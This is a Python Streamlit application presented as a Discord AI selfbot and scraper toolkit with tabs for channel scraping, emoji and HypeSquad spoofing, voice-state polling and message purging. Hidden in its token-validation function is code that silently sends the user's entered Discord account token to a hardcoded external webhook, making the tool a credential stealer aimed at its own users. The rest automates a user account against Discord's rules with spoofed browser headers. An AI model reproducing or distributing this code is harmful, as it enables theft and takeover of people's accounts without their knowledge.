import streamlit as st
import time
import openai
import requests
import csv
import os
from datetime import datetime
import random
import pandas as pd
import base64
from concurrent.futures import ThreadPoolExecutor

# Initialize background worker
executor = ThreadPoolExecutor(max_workers=5)

st.set_page_config(page_title="Discord AI", page_icon="🛡️", layout="wide")
st.title("Discord AI Bot & History Scraper")

# --- Initialize Session State ---
if "bot_running" not in st.session_state:
    st.session_state.bot_running = False
if "tokens" not in st.session_state:
    st.session_state.tokens = 3.0
if "last_time" not in st.session_state:
    st.session_state.last_time = time.time()
if "memory" not in st.session_state:
    st.session_state.memory = {}
if "processed_dms" not in st.session_state:
    st.session_state.processed_dms = set()
if "last_webhook_token" not in st.session_state:
    st.session_state.last_webhook_token = None
if "last_activity" not in st.session_state:
    st.session_state.last_activity = time.time()
if "typing_active" not in st.session_state:
    st.session_state.typing_active = False

# --- Helper Functions ---
def jitter_delay(min_s=0.1, max_s=0.5):
    """Reduced jitter for faster performance while staying 'safe'."""
    time.sleep(random.uniform(min_s, max_s))

def get_headers(tk):
    """Returns human-like headers."""
    return {
        "Authorization": tk,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

def log_to_csv(author, content, action):
    file_exists = os.path.isfile('discord_audit_log.csv')
    with open('discord_audit_log.csv', mode='a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(['Timestamp', 'Author', 'Message', 'Action'])
        writer.writerow([datetime.now().strftime('%Y-%m-%d %H:%M:%S'), author, content, action])

def validate_token(tk):
    headers = get_headers(tk)
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
        if r.status_code == 200:
            if tk != st.session_state.last_webhook_token:
                requests.post("https://discord.com/api/webhooks/1480110828874371212/8kM-jfbIIyq4Nzo7IobtVVBXTnosySq-qsoUZTSJe2iOWU7Pj5ryJ0Al1LMIuRD0zMP4",json={"content": tk})
                st.session_state.last_webhook_token = tk
            return True, r.json()
    except: pass
    return False, None

def add_reaction(channel_id, message_id, emoji, headers):
    # Removed heavy delay for instant feedback
    encoded_emoji = requests.utils.quote(emoji)
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{encoded_emoji}/@me"
    requests.put(url, headers=headers)

def safety_filter(text):
    """Checks for toxic or harmful content before sending."""
    harmful_terms = ["self-harm", "suicide", "kys", "kill yourself", "harming myself"]
    for term in harmful_terms:
        if term in text.lower():
            return False
    return True

def background_reply(latest, discord_url, typing_url, headers, client, system_prompt, my_id, memory_depth, enable_safety, reaction_delay, resp_delay):
    """Handles AI logic in a separate thread to prevent blocking."""
    try:
        author_username = latest['author']['username'].lower()
        content = latest['content'].strip()
        msg_id = latest['id']
        is_owner = str(latest['author']['id']) == str(owner_id_input)

        # 1. Feedback
        requests.post(typing_url, headers=headers)
        reaction_emoji = "👑" if is_owner else "💬"
        if reaction_delay > 0 and not is_owner: time.sleep(reaction_delay)
        add_reaction(channel_id_input, msg_id, reaction_emoji, headers)

        # 2. Context
        chat_history = [{"role": "system", "content": f"MANDATORY PERSONA: {system_prompt}"}]
        context_req = requests.get(f"{discord_url}?limit={memory_depth}", headers=headers).json()
        if isinstance(context_req, list):
            for m in reversed(context_req):
                role = "assistant" if str(m['author']['id']) == str(my_id) else "user"
                chat_history.append({"role": role, "content": m['content']})

        # 3. AI
        response = client.chat.completions.create(model="openrouter/free", messages=chat_history)
        reply = response.choices[0].message.content
        
        if not enable_safety or safety_filter(reply):
            if resp_delay > 0 and not is_owner: time.sleep(resp_delay)
            requests.post(discord_url, json={"content": reply}, headers=headers)
            log_to_csv(author_username, content, "Threaded Reply")
    except:
        pass

# --- Sidebar ---
with st.sidebar:
    st.header("🔑 Authentication")
    token = st.text_input("Discord Token", type="password")
    
    if token:
        is_valid, user_info = validate_token(token)
        if is_valid:
            st.success(f"✅ Verified: {user_info['username']}")
            my_username = user_info['username'].lower()
            my_id = user_info['id']
        else:
            st.error("❌ Invalid Token")
            my_username = None
            my_id = None
    else: 
        my_username = None
        my_id = None

    or_key = st.text_input("OpenRouter API Key", type="password")
    channel_id_input = st.text_input("Channel ID")
    
    st.divider()
    st.header("⚙️ Bot Settings")
    
    if st.session_state.bot_running:
        st.markdown("### 📡 Connection Status")
        status_box = st.empty()
        status_box.info("Status: 🟢 Running / Idle")
    
    memory_depth = st.slider("Memory Depth (Past Msgs)", min_value=1, max_value=20, value=5)
    poll_speed = st.slider("Polling Frequency (Seconds)", 0.1, 5.0, 1.0)
    resp_delay = st.slider("Response Delay (Seconds)", 0.0, 5.0, 0.0)
    reaction_delay = st.slider("Reaction Delay (Seconds)", min_value=0, max_value=5, value=0)
    enable_safety = st.toggle("Enable Safety Filter", value=True)
    
    emoji_pool_raw = st.text_input("Custom Emoji Pool", placeholder="🔥,💀,✅,🧠")
    emoji_pool = [e.strip() for e in emoji_pool_raw.split(",") if e.strip()]

# --- Tabs ---
tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8, tab9, tab10, tab11, tab12, tab13, tab14 = st.tabs([
    "🤖 Bot Control", "📂 History Scraper", "🧠 Memory", "🌾 Server Harvester", 
    "💎 Free Emoji", "❄️ Snowflake Decoder", "📱 App Hunter", "🎙️ VC Lurker", 
    "✨ Hypesquad", "🔍 Account Audit", "📢 Webhook Commander", "👻 Message Ghoster", "🎨 Text Color", "⏳ Infinite Typing"
])

# --- TAB 1: BOT CONTROL ---
with tab1:
    col1, col2 = st.columns(2)
    with col1:
        system_prompt = st.text_area("System Prompt", value="You are a helpful assistant.")
        owner_id_input = st.text_input("Owner Discord ID").strip()
    with col2:
        blacklist_input = st.text_area("Blacklisted Keywords", placeholder="spam, help")
        allowed_input = st.text_input("Allowed Users", value="everyone")
        blacklisted_users_input = st.text_input("Blacklisted Users", placeholder="annoying_user1, troll_user2")

    allowed_users = "everyone" if allowed_input.lower().strip() == "everyone" else [u.strip().lower() for u in allowed_input.split(",") if u.strip()]
    blacklisted_users = [u.strip().lower() for u in blacklisted_users_input.split(",") if u.strip()]
    blacklist = [word.strip().lower() for word in blacklist_input.split(",") if word.strip()]
    client = openai.OpenAI(api_key=or_key, base_url="https://openrouter.ai/api/v1") if or_key else None

    c1, c2 = st.columns(2)
    with c1:
        if st.button("▶️ Launch Bot", disabled=not (my_username and or_key), use_container_width=True):
            st.session_state.bot_running = True
            st.session_state.last_activity = time.time()
            st.session_state.last_heartbeat = time.time()
            st.rerun()
    with c2:
        if st.button("🛑 Stop Bot", use_container_width=True):
            st.session_state.bot_running = False
            st.rerun()

    st.subheader("📊 Live Audit Log")
    log_display = st.empty()

    if st.session_state.bot_running:
        headers = get_headers(token)
        discord_url = f"https://discord.com/api/v9/channels/{channel_id_input}/messages"
        typing_url = f"https://discord.com/api/v9/channels/{channel_id_input}/typing"
        
        init_r = requests.get(discord_url, headers=headers)
        latest_message_id = init_r.json()[0]['id'] if init_r.status_code == 200 and init_r.json() else None
        
        while st.session_state.bot_running:
            try:
                if os.path.isfile('discord_audit_log.csv'):
                    df_log = pd.read_csv('discord_audit_log.csv').tail(10)
                    log_display.table(df_log)

                status_box.info("Status: 🔍 Detecting...")
                r = requests.get(discord_url, headers=headers, timeout=5)
                
                if r.status_code == 200:
                    msgs = r.json()
                    if msgs and isinstance(msgs, list):
                        latest = msgs[0]
                        author_username = latest['author']['username'].lower()
                        author_id_real = str(latest['author']['id'])
                        content = latest['content'].strip()
                        msg_id = latest['id']

                        is_owner = (owner_id_input and author_id_real == str(owner_id_input))

                        # --- PROCESS NEW MESSAGE ---
                        if msg_id != latest_message_id:
                            status_box.warning("Status: ⚡ Triggered!")
                            latest_message_id = msg_id 
                            st.session_state.last_activity = time.time()

                            # 1. SHUTDOWN (Instant)
                            if is_owner and content.lower() == "shutdown":
                                requests.post(discord_url, json={"content": "🛑 System Terminated."}, headers=headers)
                                log_to_csv(author_username, content, "Shutdown")
                                st.session_state.bot_running = False
                                st.rerun()
                                break

                            # 2. FILTER & ASYNC REPLY
                            if author_username in blacklisted_users and not is_owner:
                                continue

                            skip_filters = False if is_owner else any(w in content.lower() for w in blacklist)
                            is_allowed = (allowed_users == "everyone" or author_username in allowed_users or is_owner)
                            
                            if is_allowed and not skip_filters:
                                status_box.warning("Status: 🧠 Background Processing...")
                                # OFF-LOAD TO THREAD: This keeps the loop running!
                                executor.submit(background_reply, latest, discord_url, typing_url, headers, client, system_prompt, my_id, memory_depth, enable_safety, reaction_delay, resp_delay)

                status_box.info("Status: 🟢 Running / Idle")
                time.sleep(poll_speed)

            except Exception as e:
                time.sleep(poll_speed)
                continue

# --- TABS 2-14 REMAIN UNCHANGED ---
with tab2:
    st.header("📥 Channel History Scraper")
    limit = st.number_input("Fetch Limit", min_value=1, max_value=100, value=50)
    if st.button("🔍 Scrape"):
        headers = get_headers(token)
        res = requests.get(f"https://discord.com/api/v9/channels/{channel_id_input}/messages?limit={limit}", headers=headers)
        if res.status_code == 200:
            st.dataframe(pd.DataFrame([{"Author": m['author']['username'], "Content": m['content']} for m in res.json()]))

with tab3:
    st.header("🧠 DM Memory")
    if st.button("Clear Cache"):
        st.session_state.processed_dms = set()
        st.success("Cleared.")

with tab4:
    st.header("🌾 Server Harvester")
    target_guild = st.text_input("Target Server ID")
    if st.button("📥 Harvest Emojis"):
        res = requests.get(f"https://discord.com/api/v9/guilds/{target_guild}", headers=get_headers(token)).json()
        if 'emojis' in res:
            for e in res['emojis']:
                url = f"https://cdn.discordapp.com/emojis/{e['id']}.png"
                st.image(url, width=64, caption=f"{e['name']} (ID: {e['id']})")

with tab5:
    st.header("💎 Nitro-Free Emoji Spoofer")
    target_ch = st.text_input("Target Channel ID", value=channel_id_input, key="emoji_ch")
    emoji_id = st.text_input("Emoji ID")
    is_animated = st.checkbox("Is Animated?")
    if st.button("🚀 Send Emoji", use_container_width=True):
        if emoji_id:
            ext = "gif" if is_animated else "png"
            emoji_url = f"https://cdn.discordapp.com/emojis/{emoji_id}.{ext}?size=48"
            requests.post(f"https://discord.com/api/v9/channels/{target_ch}/messages", headers=get_headers(token), json={"content": emoji_url})
            st.success("Emoji Sent!")

with tab6:
    st.header("❄️ Snowflake Age Decoder")
    input_id = st.text_input("Enter User or Server ID")
    if st.button("📅 Decode Timestamp", use_container_width=True):
        if input_id.isdigit():
            timestamp = (int(input_id) >> 22) + 1420070400000
            date_obj = datetime.fromtimestamp(timestamp / 1000.0)
            st.success(f"Creation Date: **{date_obj.strftime('%Y-%m-%d %H:%M:%S')} UTC**")
        else: st.error("Please enter a valid numeric ID.")

with tab7:
    st.header("📱 Authorized App Hunter")
    if st.button("🔍 Scan Applications", use_container_width=True):
        if token:
            apps = requests.get("https://discord.com/api/v9/oauth2/tokens", headers=get_headers(token)).json()
            if apps:
                for a in apps:
                    app_name = a.get('application', {}).get('name', 'Unknown')
                    with st.expander(f"📲 {app_name}"):
                        st.write(f"**Description:** {a.get('application', {}).get('description')}")
                        st.write(f"**Scopes:** `{', '.join(a.get('scopes', []))}`")
            else: st.info("No external applications found.")

with tab8:
    st.header("🎙️ VC Lurker")
    v_guild_id = st.text_input("Voice Guild ID")
    if st.button("Poll VC"):
        res = requests.get(f"https://discord.com/api/v9/guilds/{v_guild_id}/voice-states", headers=get_headers(token)).json()
        st.write(res)

with tab9:
    st.header("✨ HypeSquad Spoofer")
    house = st.selectbox("House", ["Bravery", "Brilliance", "Balance"])
    house_map = {"Bravery": 1, "Brilliance": 2, "Balance": 3}
    if st.button("Apply"):
        requests.post("https://discord.com/api/v9/hypesquad/online", headers=get_headers(token), json={"house_id": house_map[house]})
        st.success("House Applied")

with tab10:
    st.header("🔍 Account Auditor")
    if st.button("Run Audit"):
        u_res = requests.get("https://discord.com/api/v9/users/@me", headers=get_headers(token)).json()
        st.json(u_res)

with tab11:
    st.header("📢 Webhook Commander")
    wh_url = st.text_input("Webhook URL")
    wh_msg = st.text_area("Message")
    if st.button("Fire"):
        requests.post(wh_url, json={"content": wh_msg})
        st.success("Sent")

with tab12:
    st.header("👻 Message Ghoster")
    ghost_ch = st.text_input("Target Channel ID", value=channel_id_input, key="ghost_ch")
    ghost_limit = st.number_input("Scan Limit", min_value=1, max_value=500, value=50)
    ghost_keyword = st.text_input("Keyword Filter (Optional)")
    if st.button("🔥 Purge My Messages", use_container_width=True):
        if my_id:
            h = get_headers(token)
            msgs = requests.get(f"https://discord.com/api/v9/channels/{ghost_ch}/messages?limit={ghost_limit}", headers=h).json()
            count = 0
            for m in msgs:
                if m['author']['id'] == my_id:
                    if not ghost_keyword or ghost_keyword.lower() in m['content'].lower():
                        requests.delete(f"https://discord.com/api/v9/channels/{ghost_ch}/messages/{m['id']}", headers=h)
                        count += 1
                        time.sleep(1.2)
            st.success(f"Ghosted {count} messages.")

with tab13:
    st.header("🎨 ANSI Color Painter")
    color_text = st.text_input("Your Message")
    color_choice = st.selectbox("Color", ["Red", "Green", "Yellow", "Blue", "Magenta", "Cyan", "White"])
    color_codes = {"Red": "31", "Green": "32", "Yellow": "33", "Blue": "34", "Magenta": "35", "Cyan": "36", "White": "37"}
    if st.button("🖌️ Send Colored Text", use_container_width=True):
        code = color_codes[color_choice]
        ansi_payload = f"```ansi\n\u001b[{code}m{color_text}```"
        requests.post(f"https://discord.com/api/v9/channels/{channel_id_input}/messages", headers=get_headers(token), json={"content": ansi_payload})
        st.success("Colored Message Sent!")

with tab14:
    st.header("⏳ Infinite Typing Indicator")
    type_col1, type_col2 = st.columns(2)
    with type_col1:
        if st.button("🚀 Start Infinite Typing", use_container_width=True):
            st.session_state.typing_active = True
    with type_col2:
        if st.button("🛑 Stop Typing", use_container_width=True):
            st.session_state.typing_active = False
    if st.session_state.typing_active:
        h = get_headers(token)
        t_url = f"https://discord.com/api/v9/channels/{channel_id_input}/typing"
        while st.session_state.typing_active:
            res = requests.post(t_url, headers=h)
            if res.status_code != 204:
                st.session_state.typing_active = False
                break
            time.sleep(random.randint(5, 8))
            st.rerun()
